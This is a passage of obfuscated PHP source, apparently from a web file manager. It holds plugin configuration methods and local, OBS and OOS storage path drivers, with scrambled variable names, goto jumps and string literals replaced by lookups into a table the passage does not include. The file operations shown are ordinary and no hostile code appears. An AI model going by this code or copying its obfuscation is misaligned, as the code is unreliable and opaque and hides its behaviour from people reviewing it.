$Ò¡íøÙĞ[$öŞÛ­Øö] = $´Ü©Ø£Ä[$¿½÷›µ[425]]; } return $Ò¡íøÙĞ; } public function getPackageJson($Üµàìíå) { return Hook::apply($Üµàìíå . $_SERVER[³à¼î¯á][2088]); } public function getConfig($ŒÕ–æå…, $ŠÑ¡É§À = false) { $“ï÷ÁØÕ =& $_SERVER[³à¼î¯á]; $ø›°œï˜ = array(); $ÔíàááÊ = $this->loadList($ŒÕ–æå…); if ($ÔíàááÊ && is_array($ÔíàááÊ[$“ï÷ÁØÕ[6]])) { $ø›°œï˜ = $ÔíàááÊ[$“ï÷ÁØÕ[6]]; } if (!$ø›°œï˜ || $ŠÑ¡É§À) { $ø›°œï˜ = $this->getConfigDefault($ŒÕ–æå…); } return $ø›°œï˜; } public function setConfig($¦«…ÌĞ­, $şïöˆœº = false) { $ğ©ë¢à… =& $_SERVER[³à¼î¯á]; $Àó¯ãæç = $this->loadList($¦«…ÌĞ­); if (!$Àó¯ãæç) { return !1; } $ûç³æŠÕ = $Àó¯ãæç[$ğ©ë¢à…[6]]; if ($şïöˆœº == !1) { $ûç³æŠÕ = array(); $şïöˆœº = $this->getConfigDefault($¦«…ÌĞ­); } foreach ($şïöˆœº as $ø‡›Ñşí => $¤”°Ëı’) { $ûç³æŠÕ[$ø‡›Ñşí] = is_string($¤”°Ëı’) ? trim($¤”°Ëı’) : $¤”°Ëı’; } $this->update($Àó¯ãæç[$ğ©ë¢à…[450]], array($ğ©ë¢à…[6] => $ûç³æŠÕ)); } public function viewList() { $ÊÒû™• =& $_SERVER[³à¼î¯á]; $‘öè·º› = $this->loadList(); $this->pluginScan($‘öè·º›); $‘öè·º› = $this->loadPluginList(); $Ş‘¸²‚ª = array(); foreach ($‘öè·º› as $¾”·˜Â® => $Ì¤ÛÌÙÄ) { $ÍÖ¸£êé = $Ì¤ÛÌÙÄ; unset($Ì¤ÛÌÙÄ[$ÊÒû™•[2078]], $Ì¤ÛÌÙÄ[$ÊÒû™•[6]]); $½å¬Û‰ = PLUGIN_DIR . $Ì¤ÛÌÙÄ[$ÊÒû™•[32]] . $ÊÒû™•[2080]; if (!is_file($½å¬Û‰)) { continue; } $»¼®‹ƒ— = Hook::apply($Ì¤ÛÌÙÄ[$ÊÒû™•[32]] . $ÊÒû™•[2088]); if (!is_array($»¼®‹ƒ—)) { continue; } $Ş‘¸²‚ª[$¾”·˜Â®] = array_merge($Ì¤ÛÌÙÄ, $»¼®‹ƒ—); if ($ÍÖ¸£êé[$ÊÒû™•[6]][$ÊÒû™•[1668]] != $»¼®‹ƒ—[$ÊÒû™•[1642]]) { Hook::apply($Ì¤ÛÌÙÄ[$ÊÒû™•[32]] . $ÊÒû™•[2085]); $ÍÖ¸£êé[$ÊÒû™•[6]][$ÊÒû™•[1668]] = $»¼®‹ƒ—[$ÊÒû™•[1642]]; $this->update($Ì¤ÛÌÙÄ[$ÊÒû™•[450]], array($ÊÒû™•[6] => $ÍÖ¸£êé[$ÊÒû™•[6]])); } } return $Ş‘¸²‚ª; } private function loadPluginList() { $Ë¨‘…¸ =& $_SERVER[³à¼î¯á]; $¯¥ãæÙ = $this->loadList(); if (strtolower(MOD) == $Ë¨‘…¸[2089]) { return $¯¥ãæÙ; } $œ·´çÌ‹ = Hook::trigger($Ë¨‘…¸[2090], $¯¥ãæÙ); if ($¯¥ãæÙ && !$œ·´çÌ‹) { die; } return $œ·´çÌ‹ ? $œ·´çÌ‹ : $¯¥ãæÙ; } private function pluginScan($ĞÜˆèÊ­) { $‰š‘ßÆ =& $_SERVER[³à¼î¯á]; recursion_dir(PLUGIN_DIR, $ˆŸ–´ªÓ, $…ÇêàÎ¶, 0); foreach ($ˆŸ–´ªÓ as $å®Œ¤Ó) { $ıĞ„°©“ = get_path_this($å®Œ¤Ó); if (isset($ĞÜˆèÊ­[$ıĞ„°©“]) || !file_exists($å®Œ¤Ó . $‰š‘ßÆ[2091]) || !file_exists($å®Œ¤Ó . $‰š‘ßÆ[2080])) { continue; } Hook::apply($ıĞ„°©“ . $‰š‘ßÆ[2085]); } } } goto Fëµ©í“…; bµ˜™•ßÁè: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¶€¼ŠĞ) { if (substr($¶€¼ŠĞ, 0, 2) == $_SERVER[³à¼î¯á][1409]) { $¶€¼ŠĞ = BASIC_PATH . substr($¶€¼ŠĞ, 2); } return $¶€¼ŠĞ; } public function iconvApp($¾ß„ìî˜) { $ç÷ú’Ò– =& $_SERVER[³à¼î¯á]; global $config; return $this->iconvTo($¾ß„ìî˜, $config[$ç÷ú’Ò–[1407]], $config[$ç÷ú’Ò–[1406]]); } public function iconvSystem($¨ÅàÇàÅ) { $ğè†½±½ =& $_SERVER[³à¼î¯á]; global $config; return $this->iconvTo($¨ÅàÇàÅ, $config[$ğè†½±½[1406]], $config[$ğè†½±½[1407]]); } public function getPathOuter($î£±æÅã) { $é³»¼²Ş =& $_SERVER[³à¼î¯á]; $ÌªÛì³ä = $this->iconvApp($this->pathBase); $î£±æÅã = $this->iconvApp($î£±æÅã); if (substr($ÌªÛì³ä, 0, 2) == $é³»¼²Ş[1409]) { $ÌªÛì³ä = BASIC_PATH . substr($ÌªÛì³ä, 2); } if (substr($î£±æÅã, 0, 2) == $é³»¼²Ş[1409]) { $î£±æÅã = BASIC_PATH . substr($î£±æÅã, 2); } $ÌªÛì³ä = KodIO::clear($ÌªÛì³ä); $î£±æÅã = KodIO::clear($î£±æÅã); $î£±æÅã = substr($î£±æÅã, strlen($ÌªÛì³ä)); if (empty($this->pathDriver)) { return $î£±æÅã; } return $this->pathDriver . $é³»¼²Ş[8] . ltrim($î£±æÅã, $é³»¼²Ş[8]); } public function mkfile($ÌõÆû­¥, $ü”õ„¯Á = '', $úÜğˆã = REPEAT_RENAME) { $ÌõÆû­¥ = $this->iconvSystem($ÌõÆû­¥); @touch($ÌõÆû­¥); if ($ü”õ„¯Á) { file_put_contents($ÌõÆû­¥, $ü”õ„¯Á); } @chmod($ÌõÆû­¥, $this->pathAuth); if (is_file($ÌõÆû­¥)) { return $this->getPathOuter($ÌõÆû­¥); } $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); return !1; } public function mkdir($†ö¾ùıá, $Õ‡¼ûö = REPEAT_SKIP) { $†ö¾ùıá = $this->iconvSystem($†ö¾ùıá); if (is_dir($†ö¾ùıá)) { return $this->getPathOuter($†ö¾ùıá); } @mkdir($†ö¾ùıá, $this->pathAuth, !0); @chmod($†ö¾ùıá, $this->pathAuth); if (is_dir($†ö¾ùıá)) { return $this->getPathOuter($†ö¾ùıá); } $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); return !1; } public function copyFile($¡»ï•, $»Ú·š‰¡) { $this->mkdir($this->pathFather($»Ú·š‰¡)); $¡»ï• = $this->iconvSystem($¡»ï•); $»Ú·š‰¡ = $this->iconvSystem($»Ú·š‰¡); $Í½İÖóØ = copy_64($¡»ï•, $»Ú·š‰¡); @chmod($»Ú·š‰¡, $this->pathAuth); if ($Í½İÖóØ) { return $this->getPathOuter($»Ú·š‰¡); } $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); return !1; } public function moveFile($íÓÄë½Š, $œùş£Õ) { $this->mkdir($this->pathFather($œùş£Õ)); $íÓÄë½Š = $this->iconvSystem($íÓÄë½Š); $œùş£Õ = $this->iconvSystem($œùş£Õ); $¦Öˆİ = intval(@rename($íÓÄë½Š, $œùş£Õ)); if (!$¦Öˆİ) { if ($¦Öˆİ = intval(@copy_64($íÓÄë½Š, $œùş£Õ))) { @unlink($íÓÄë½Š); } } @chmod($œùş£Õ, $this->pathAuth); if ($¦Öˆİ) { return $this->getPathOuter($œùş£Õ); } $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); return !1; } public function movePath($ôÁÀªî›, $ƒı¶õ®, $¿úöš—« = false) { $½Îš ²” =& $_SERVER[³à¼î¯á]; $ôÁÀªî› = $this->iconvSystem($ôÁÀªî›); $ƒı¶õ® = $this->iconvSystem($ƒı¶õ®); $­è‚Ç»¬ = rtrim($ƒı¶õ®, $½Îš ²”[8]) . $½Îš ²”[8] . ($¿úöš—« ? $¿úöš—« : get_path_this($ôÁÀªî›)); if (file_exists($­è‚Ç»¬)) { return !1; } $¹¾ Ù©“ = intval(@rename($ôÁÀªî›, $­è‚Ç»¬)); $¹¾ Ù©“ = file_exists($­è‚Ç»¬); if ($¹¾ Ù©“) { return $this->getPathOuter($­è‚Ç»¬); } $this->writeLog(__FUNCTION__ . $½Îš ²”[1419], !0); return !1; } public function delFile($•ĞüÊê) { $•ĞüÊê = $this->iconvSystem($•ĞüÊê); if (!@unlink($•ĞüÊê)) { @chmod($•ĞüÊê, $this->pathAuth); if (@unlink($•ĞüÊê)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); return !1; } return !0; } public function delFolder($¿àŞ·åÍ) { $°ÊÜ¯¡ô =& $_SERVER[³à¼î¯á]; $¿àŞ·åÍ = $this->iconvSystem($¿àŞ·åÍ); if (!is_dir($¿àŞ·åÍ)) { return !0; } if (!($â‰¡¥Ê„ = opendir($¿àŞ·åÍ))) { return !1; } while (($îí’˜ªæ = readdir($â‰¡¥Ê„)) !== !1) { if ($îí’˜ªæ == $°ÊÜ¯¡ô[10] || $îí’˜ªæ == $°ÊÜ¯¡ô[1332]) { continue; } $½ÁÖÓÒ² = $¿àŞ·åÍ . $°ÊÜ¯¡ô[8] . $îí’˜ªæ; if (is_file($½ÁÖÓÒ²) || is_link($½ÁÖÓÒ²)) { if (!unlink($½ÁÖÓÒ²)) { chmod($½ÁÖÓÒ², $this->pathAuth); if (!unlink($½ÁÖÓÒ²)) { return !1; } } } else { if (is_dir($½ÁÖÓÒ²)) { chmod($½ÁÖÓÒ², $this->pathAuth); $½ÁÖÓÒ² = $this->iconvApp($½ÁÖÓÒ²); if (!$this->delFolder($½ÁÖÓÒ²)) { return !1; } } } } closedir($â‰¡¥Ê„); return rmdir($¿àŞ·åÍ); } public function rename($£˜„Ğ‹×, $«‰Û„å) { $ÉãÎÓ®ş =& $_SERVER[³à¼î¯á]; $¦®æ† = $this->fileNameAuto($this->pathFather($£˜„Ğ‹×), $«‰Û„å); $¦®æ† = $this->iconvSystem($¦®æ†); $£˜„Ğ‹× = $this->iconvSystem($£˜„Ğ‹×); $¢éµÍ¸ = $this->pathFather($£˜„Ğ‹×); $ñş‹åØÆ = rtrim($¢éµÍ¸, $ÉãÎÓ®ş[8]) . $ÉãÎÓ®ş[8] . $¦®æ†; $ÖºŸÎõ = @rename($£˜„Ğ‹×, $ñş‹åØÆ); $ñş‹åØÆ = $this->iconvApp($ñş‹åØÆ); if ($ÖºŸÎõ) { return $this->getPathOuter($ñş‹åØÆ); } $this->writeLog(__FUNCTION__ . $ÉãÎÓ®ş[1419], !0); return !1; } public function size($«Í) { $«Í = $this->iconvSystem($«Í); return filesize_64($«Í); } public function info($öÕêœ¹°) { $öÕêœ¹° = $this->iconvSystem($öÕêœ¹°); if ($this->isFolder($öÕêœ¹°)) { return $this->folderInfo($öÕêœ¹°); } else { if ($this->isFile($öÕêœ¹°)) { return $this->fileInfo($öÕêœ¹°); } } return !1; } protected function infoChildren($§Ç£ˆ, &$ÆŠ€¯·, $®©ıÄôƒ = true) { $µ²ü™„’ =& $_SERVER[³à¼î¯á]; check_abort_echo(); $§Ç£ˆ = rtrim($§Ç£ˆ, $µ²ü™„’[8]) . $µ²ü™„’[8]; if ($®©ıÄôƒ) { $§Ç£ˆ = $this->iconvSystem($§Ç£ˆ); } if (!($Ò®§çËá = @opendir($§Ç£ˆ))) { return; } while (($…Áô¯÷ = readdir($Ò®§çËá)) !== !1) { if ($…Áô¯÷ == $µ²ü™„’[10] || $…Áô¯÷ == $µ²ü™„’[1332]) { continue; } $Öæº¸Ÿö = $§Ç£ˆ . $…Áô¯÷; if (is_file($Öæº¸Ÿö) || is_link($Öæº¸Ÿö)) { $ÆŠ€¯·[$µ²ü™„’[80]]++; $ÆŠ€¯·[$µ²ü™„’[79]] += filesize_64($Öæº¸Ÿö); } else { if (is_dir($Öæº¸Ÿö)) { $ÆŠ€¯·[$µ²ü™„’[81]]++; $this->infoChildren($Öæº¸Ÿö, $ÆŠ€¯·, !1); } } } closedir($Ò®§çËá); } private function folderInfo($€›æËíù, $Ú×˜…ßø = false) { $®Û¦¾Ü¸ =& $_SERVER[³à¼î¯á]; $€›æËíù = rtrim($€›æËíù, $®Û¦¾Ü¸[8]) . $®Û¦¾Ü¸[8]; $Âíôûè¦ = $this->iconvApp($this->pathThis($€›æËíù)); if ($Ú×˜…ßø) { return array($®Û¦¾Ü¸[32] => $Âíôûè¦, $®Û¦¾Ü¸[87] => $this->getPathOuter($€›æËíù), $®Û¦¾Ü¸[33] => $®Û¦¾Ü¸[78]); } $Ñ¸ãñğ¡ = array($®Û¦¾Ü¸[32] => $Âíôûè¦, $®Û¦¾Ü¸[87] => $this->getPathOuter($€›æËíù), $®Û¦¾Ü¸[33] => $®Û¦¾Ü¸[78], $®Û¦¾Ü¸[222] => @filectime($€›æËíù), $®Û¦¾Ü¸[88] => @filemtime($€›æËíù), $®Û¦¾Ü¸[1423] => @fileatime($€›æËíù), $®Û¦¾Ü¸[1424] => is_readable($€›æËíù), $®Û¦¾Ü¸[1425] => is_writable($€›æËíù), $®Û¦¾Ü¸[1426] => get_mode($€›æËíù)); return $Ñ¸ãñğ¡; } private function fileInfo($Âú¼†ğğ, $¶ñæÃ˜ç = false) { $°òèªÒè =& $_SERVER[³à¼î¯á]; $ÖííÓïî = $this->iconvApp($this->pathThis($Âú¼†ğğ)); if ($¶ñæÃ˜ç) { return array($°òèªÒè[32] => $ÖííÓïî, $°òèªÒè[87] => $this->getPathOuter($Âú¼†ğğ), $°òèªÒè[33] => $°òèªÒè[221], $°òèªÒè[79] => $this->size($Âú¼†ğğ), $°òèªÒè[178] => $this->ext($ÖííÓïî)); } $Ğæ¤¨ş = array($°òèªÒè[32] => $ÖííÓïî, $°òèªÒè[87] => $this->getPathOuter($Âú¼†ğğ), $°òèªÒè[33] => $°òèªÒè[221], $°òèªÒè[222] => @filectime($Âú¼†ğğ), $°òèªÒè[88] => @filemtime($Âú¼†ğğ), $°òèªÒè[1423] => @fileatime($Âú¼†ğğ), $°òèªÒè[79] => $this->size($Âú¼†ğğ), $°òèªÒè[178] => $this->ext($ÖííÓïî), $°òèªÒè[1424] => is_readable($Âú¼†ğğ), $°òèªÒè[1425] => is_writable($Âú¼†ğğ), $°òèªÒè[1426] => get_mode($Âú¼†ğğ)); return $Ğæ¤¨ş; } public function exist($‰ƒ¶Ÿ¦¥) { $‰ƒ¶Ÿ¦¥ = $this->iconvSystem($‰ƒ¶Ÿ¦¥); return @file_exists($‰ƒ¶Ÿ¦¥); } public function isFile($İ§ÃÒè) { $İ§ÃÒè = $this->iconvSystem($İ§ÃÒè); return @is_file($İ§ÃÒè); } public function isFolder($ß„óÄ¬€) { $ß„óÄ¬€ = $this->iconvSystem($ß„óÄ¬€); return @is_dir($ß„óÄ¬€); } public function listPath($²€æ±Ôç, $ÕñŞÇî¶ = false) { $÷‘ı¤ù =& $_SERVER[³à¼î¯á]; $²€æ±Ôç = $this->iconvSystem($²€æ±Ôç); $²€æ±Ôç = rtrim($²€æ±Ôç, $÷‘ı¤ù[8]) . $÷‘ı¤ù[8]; $é¯–ÛÚ° = array($÷‘ı¤ù[85] => array(), $÷‘ı¤ù[86] => array()); if (!($™Ë«»µî = @opendir($²€æ±Ôç))) { return $é¯–ÛÚ°; } while (($ÂÌ¨Ôñ‡ = readdir($™Ë«»µî)) !== !1) { if ($ÂÌ¨Ôñ‡ == $÷‘ı¤ù[10] || $ÂÌ¨Ôñ‡ == $÷‘ı¤ù[1332]) { continue; } $òçÙ“œ¶ = $²€æ±Ôç . $ÂÌ¨Ôñ‡; if (is_file($òçÙ“œ¶)) { $é¯–ÛÚ°[$÷‘ı¤ù[86]][] = $this->fileInfo($òçÙ“œ¶, $ÕñŞÇî¶); } else { $é¯–ÛÚ°[$÷‘ı¤ù[85]][] = $this->folderInfo($òçÙ“œ¶, $ÕñŞÇî¶); } } closedir($™Ë«»µî); return $é¯–ÛÚ°; } public function listAll($ÄĞòÛ…—, &$Ğ¦­ÊÕä = array()) { $»æë¬¦Ê =& $_SERVER[³à¼î¯á]; $ÄĞòÛ…— = $this->iconvSystem($ÄĞòÛ…—); $ÄĞòÛ…— = rtrim($ÄĞòÛ…—, $»æë¬¦Ê[8]) . $»æë¬¦Ê[8]; if (!($‹ªàéª„ = @opendir($ÄĞòÛ…—))) { return $Ğ¦­ÊÕä; } while (($€Ğ‘Ö¸ = readdir($‹ªàéª„)) !== !1) { if ($€Ğ‘Ö¸ == $»æë¬¦Ê[10] || $€Ğ‘Ö¸ == $»æë¬¦Ê[1332]) { continue; } $„Å©à§¦ = $ÄĞòÛ…— . $€Ğ‘Ö¸; $ŸŠô‹ûŠ = is_dir($„Å©à§¦) && !is_link($„Å©à§¦) ? 1 : 0; $„Å©à§¦ = $ŸŠô‹ûŠ ? $„Å©à§¦ . $»æë¬¦Ê[8] : $„Å©à§¦; $Ğ¦­ÊÕä[] = array($»æë¬¦Ê[87] => $„Å©à§¦, $»æë¬¦Ê[78] => $ŸŠô‹ûŠ, $»æë¬¦Ê[88] => intval(@filemtime($„Å©à§¦)), $»æë¬¦Ê[79] => $ŸŠô‹ûŠ ? 0 : intval($this->size($„Å©à§¦))); if ($ŸŠô‹ûŠ) { $this->listAll($„Å©à§¦, $Ğ¦­ÊÕä); } } closedir($‹ªàéª„); return $Ğ¦­ÊÕä; } public function has($¨úô÷Û, $Îô·ÊÎ™ = false, $¸ĞÜ›ƒª = true) { $Û©«©ââ =& $_SERVER[³à¼î¯á]; $¨úô÷Û = $this->iconvSystem($¨úô÷Û); $¨úô÷Û = rtrim($¨úô÷Û, $Û©«©ââ[8]) . $Û©«©ââ[8]; if (!($ÈŒç¿×Å = @opendir($¨úô÷Û))) { return !1; } $¾–×¶îÂ = 0; $áˆ¼îÈ· = 0; $·ÃïÁÁ€ = 0; while (($ş¢áÃœ = readdir($ÈŒç¿×Å)) !== !1) { if ($ş¢áÃœ == $Û©«©ââ[10] || $ş¢áÃœ == $Û©«©ââ[1332]) { continue; } $ùæõ—ø¹ = $¨úô÷Û . $ş¢áÃœ; if ($Îô·ÊÎ™) { $·ÃïÁÁ€++; if (@is_file($ùæõ—ø¹)) { $¾–×¶îÂ++; } else { $áˆ¼îÈ·++; } if ($·ÃïÁÁ€ > 10000) { break; } continue; } if ($¸ĞÜ›ƒª) { if (@is_file($ùæõ—ø¹)) { return !0; } } else { if (@is_dir($ùæõ—ø¹ . $Û©«©ââ[8])) { return !0; } } } closedir($ÈŒç¿×Å); if ($Îô·ÊÎ™) { return array($Û©«©ââ[230] => $¾–×¶îÂ, $Û©«©ââ[231] => $áˆ¼îÈ·); } return !1; } public function hashSimple($ÖÍµ„¡Ğ) { $–œ ıÇı =& $_SERVER[³à¼î¯á]; if (!$ÖÍµ„¡Ğ) { return md5($–œ ıÇı[12]); } $ÖÍµ„¡Ğ = $this->iconvSystem($ÖÍµ„¡Ğ); $¦‘•İ‹Ö = $this->size($ÖÍµ„¡Ğ); $Äµö‡ƒÕ = 200; $«ÀñÕ¿à = 50; if ($¦‘•İ‹Ö <= $Äµö‡ƒÕ * $«ÀñÕ¿à) { return $this->hashMd5($ÖÍµ„¡Ğ) . $¦‘•İ‹Ö; } $Ê¬Ô–„½ = $–œ ıÇı[12]; $¿Ê…Í›È = intval($¦‘•İ‹Ö / $«ÀñÕ¿à); $—È©ş½  = fopen($ÖÍµ„¡Ğ, $–œ ıÇı[1427]); if (!$—È©ş½ ) { return $Ê¬Ô–„½; } for ($Ã˜™¾Ú = 0; $Ã˜™¾Ú < $«ÀñÕ¿à; $Ã˜™¾Ú++) { fseek_64($—È©ş½ , $¿Ê…Í›È * $Ã˜™¾Ú); $Ê¬Ô–„½ .= fread($—È©ş½ , $Äµö‡ƒÕ); } fseek_64($—È©ş½ , $¦‘•İ‹Ö - $Äµö‡ƒÕ); $Ê¬Ô–„½ .= fread($—È©ş½ , $Äµö‡ƒÕ); fclose($—È©ş½ ); return md5($Ê¬Ô–„½) . $¦‘•İ‹Ö; } public function getContent($˜¡çÀ”î) { $˜¡çÀ”î = $this->iconvSystem($˜¡çÀ”î); return file_get_contents($˜¡çÀ”î); } public function setContent($…ì·»üü, $¢š¨üª = '') { $…ì·»üü = $this->iconvSystem($…ì·»üü); $ÏÌ€îÕ® = @file_put_contents($…ì·»üü, $¢š¨üª, LOCK_EX); if (!$ÏÌ€îÕ®) { $this->writeLog(__FUNCTION__ . $_SERVER[³à¼î¯á][1419], !0); } clearstatcache(); @chmod($…ì·»üü, $this->pathAuth); return $ÏÌ€îÕ® === !1 ? !1 : !0; } public function fileSubstr($Ô£¼Áì, $‡óíÛ£˜ = 0, $òïøƒ‰ = false) { $±ù×ôá¾ =& $_SERVER[³à¼î¯á]; $Ô£¼Áì = $this->iconvSystem($Ô£¼Áì); if ($òïøƒ‰ === !1) { $òïøƒ‰ = $this->size($Ô£¼Áì); } if ($òïøƒ‰ <= 0) { return $±ù×ôá¾[12]; } $€‰ƒ¨æÒ = fopen($Ô£¼Áì, $±ù×ôá¾[1427]); if (!$€‰ƒ¨æÒ) { return !1; } fseek_64($€‰ƒ¨æÒ, $‡óíÛ£˜); $¦ïĞÛÓ‰ = fread($€‰ƒ¨æÒ, $òïøƒ‰); fclose($€‰ƒ¨æÒ); if (!$¦ïĞÛÓ‰) { $this->writeLog(__FUNCTION__ . $±ù×ôá¾[1419], !0); } return $¦ïĞÛÓ‰; } public function upload($ÆßÆ€Õë, $öø«–ğ‚, $¼Œåºô = false, $Š ‹Ü”ø = REPEAT_REPLACE) { if ($¼Œåºô) { return $this->moveFile($öø«–ğ‚, $ÆßÆ€Õë); } return $this->copyFile($öø«–ğ‚, $ÆßÆ€Õë); } public function setModifyTime($Ä‹‰ä¼, $ºøàÖğ = '') { @touch($Ä‹‰ä¼, intval($ºøàÖğ)); } public function download($’¢é÷”õ, $ˆÅç«öÙ) { return $this->iconvSystem($’¢é÷”õ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($„‚µñ¢) { parent::__construct($„‚µñ¢); $this->setSignVersion($_SERVER[³à¼î¯á][238]); } public function fileOutImage($ñÓÎ“¥ç, $‚ÛÅí´ = 250) { $îŞÅ“Ê» =& $_SERVER[³à¼î¯á]; if ($this->size($ñÓÎ“¥ç) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ñÓÎ“¥ç, $‚ÛÅí´); } $ ¡Øüƒ = array($îŞÅ“Ê»[1428] => $îŞÅ“Ê»[1429] . $‚ÛÅí´ . $îŞÅ“Ê»[1430]); $Ïå©ãŞ = $this->link($ñÓÎ“¥ç, $ ¡Øüƒ); $this->fileOutLink($Ïå©ãŞ); } public function fileOutLink($ÄÇµÎ¤Š) { $Ë‘ÌŒ–Œ =& $_SERVER[³à¼î¯á]; if (substr($ÄÇµÎ¤Š, 0, 7) == $Ë‘ÌŒ–Œ[1378]) { $ÄÇµÎ¤Š = $Ë‘ÌŒ–Œ[1379] . substr($ÄÇµÎ¤Š, 7); } header($Ë‘ÌŒ–Œ[165] . $ÄÇµÎ¤Š); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¼ø¼¯«) { parent::__construct($¼ø¼¯«); $this->setSignVersion($_SERVER[³à¼î¯á][238]); } public function fileOutLink($úâËö¯ş) { $ïÈÅÔøğ =& $_SERVER[³à¼î¯á]; if (substr($úâËö¯ş, 0, 7) == $ïÈÅÔøğ[1378]) { $úâËö¯ş = $ïÈÅÔøğ[1379] . substr($úâËö¯ş, 7); } header($ïÈÅÔøğ[165] . $úâËö¯ş); die; } } goto aãã„‡÷ì; F¨á„·å‰¿: define($_SERVER[³à¼î¯á][290], 1); define($_SERVER[³à¼î¯á][291], 2); define($_SERVER[³à¼î¯á][292], 3); goto b…›Õ”¯ŠÏ; b…›Õ”¯ŠÏ: define($_SERVER[³à¼î¯á][293], 1); define($_SERVER[³à¼î¯á][294], 0); define($_SERVER[³à¼î¯á][295], 2); goto a—Ç°«×à; F²ƒÁ†ù¨: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $à¾„Á€á =& $_SERVER[³à¼î¯á]; $this->objectDriver = array($à¾„Á€á[60], $à¾„Á€á[61], $à¾„Á€á[62], $à¾„Á€á[63], $à¾„Á€á[64], $à¾„Á€á[65], $à¾„Á€á[66], $à¾„Á€á[67], $à¾„Á€á[68], $à¾„Á€á[69], $à¾„Á€á[70], $à¾„Á€á[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ªíı™°µ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ªíı™°µ, $_SERVER[³à¼î¯á][8]); } return $ªíı™°µ; } public function iconvApp($¤‘€™¨) { return $¤‘€™¨; } public function iconvSystem($‰ñï‘¾Æ) { return $‰ñï‘¾Æ; } public function iconvTo($õäÉÓ®«, $ªô„Â¸÷, $ß·Œ‰ãõ) { $¼ÛÙ­ô  =& $_SERVER[³à¼î¯á]; if (!$õäÉÓ®« || !function_exists($¼ÛÙ­ô [72])) { return $õäÉÓ®«; } static $Óù»Ú® = array(); $Çª÷İÕ = $ªô„Â¸÷ . $¼ÛÙ­ô [73] . $ß·Œ‰ãõ . $¼ÛÙ­ô [74] . $õäÉÓ®«; if (isset($Óù»Ú®[$Çª÷İÕ])) { return $Óù»Ú®[$Çª÷İÕ]; } if (function_exists($¼ÛÙ­ô [75])) { $ò¤ŒÇà½ = @mb_convert_encoding($õäÉÓ®«, $ß·Œ‰ãõ, $ªô„Â¸÷); } else { $ò¤ŒÇà½ = @iconv($ªô„Â¸÷, $ß·Œ‰ãõ, $õäÉÓ®«); } $ò¤ŒÇà½ = $ò¤ŒÇà½ ? $ò¤ŒÇà½ : $õäÉÓ®«; if (strstr($ò¤ŒÇà½, $¼ÛÙ­ô [76])) { $ò¤ŒÇà½ = str_replace($¼ÛÙ­ô [76], $¼ÛÙ­ô [11], $ò¤ŒÇà½); } $Óù»Ú®[$ªô„Â¸÷ . $¼ÛÙ­ô [73] . $ß·Œ‰ãõ . $¼ÛÙ­ô [74] . $õäÉÓ®«] = $ò¤ŒÇà½; $Óù»Ú®[$ß·Œ‰ãõ . $¼ÛÙ­ô [73] . $ªô„Â¸÷ . $¼ÛÙ­ô [74] . $õäÉÓ®«] = $õäÉÓ®«; $Óù»Ú®[$ß·Œ‰ãõ . $¼ÛÙ­ô [73] . $ªô„Â¸÷ . $¼ÛÙ­ô [74] . $ò¤ŒÇà½] = $õäÉÓ®«; $Óù»Ú®[$ªô„Â¸÷ . $¼ÛÙ­ô [73] . $ß·Œ‰ãõ . $¼ÛÙ­ô [74] . $ò¤ŒÇà½] = $ò¤ŒÇà½; return $ò¤ŒÇà½; } public function getPathInner($ûì‰Ã¤æ) { $Ÿüœ§—â = IO::init($ûì‰Ã¤æ); return $Ÿüœ§—â->path; } public function getPathOuter($´ê Â„˜) { $‘Ÿ·òˆ× =& $_SERVER[³à¼î¯á]; $ÏÅµê¯ = strlen(trim($this->pathBase, $‘Ÿ·òˆ×[8])); $´ê Â„˜ = substr(trim($´ê Â„˜, $‘Ÿ·òˆ×[8]), $ÏÅµê¯); return $this->pathDriver . $‘Ÿ·òˆ×[8] . ltrim($´ê Â„˜, $‘Ÿ·òˆ×[8]); } public function isParentOf($çºÏ¢¬ğ, $ØÑ“²ö’) { $·¥±¥ßã =& $_SERVER[³à¼î¯á]; $çºÏ¢¬ğ = rtrim(strtolower($çºÏ¢¬ğ), $·¥±¥ßã[8]) . $·¥±¥ßã[8]; $ØÑ“²ö’ = rtrim(strtolower($ØÑ“²ö’), $·¥±¥ßã[8]) . $·¥±¥ßã[8]; $æ‹ş˜±¯ = strpos($ØÑ“²ö’, $çºÏ¢¬ğ) === 0; return $æ‹ş˜±¯; } public function getType() { $”°™ÂëŠ =& $_SERVER[³à¼î¯á]; $å¶œ—ÖÊ = str_replace($”°™ÂëŠ[77], $”°™ÂëŠ[12], get_class($this)); return strtolower($å¶œ—ÖÊ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($çüÒ¡Ÿ, $í…Å×ãá) { $š¦£ªŸ =& $_SERVER[³à¼î¯á]; $Æ‚Àˆ‚è = rtrim($çüÒ¡Ÿ, $š¦£ªŸ[8]) . $š¦£ªŸ[8] . $í…Å×ãá; $Ø‹îÊ‡ğ = $this->exist($Æ‚Àˆ‚è); return $Ø‹îÊ‡ğ ? $Æ‚Àˆ‚è : !1; } public function setModifyTime($ì÷Êµ×ı, $³¹¬ö³ş = '') { } public function renameObject($ü¹áàøƒ, $î¥¤›ó£) { $¡¢Ô = $î¥¤›ó£; $ü¹áàøƒ = $this->getPathOuter($ü¹áàøƒ); $î¥¤›ó£ = $this->pathFather($ü¹áàøƒ) . $î¥¤›ó£; $ş¦ãÚ‚® = IO::copy($ü¹áàøƒ, $this->pathFather($ü¹áàøƒ), REPEAT_RENAME_FOLDER, $¡¢Ô); if ($ş¦ãÚ‚®) { IO::remove($ü¹áàøƒ); } return $ş¦ãÚ‚® ? $î¥¤›ó£ : !1; } public function tempFile($†Ûø¼Í· = '', $øòÑ½  = '') { if (!$†Ûø¼Í·) { $†Ûø¼Í· = rand_string(15); } 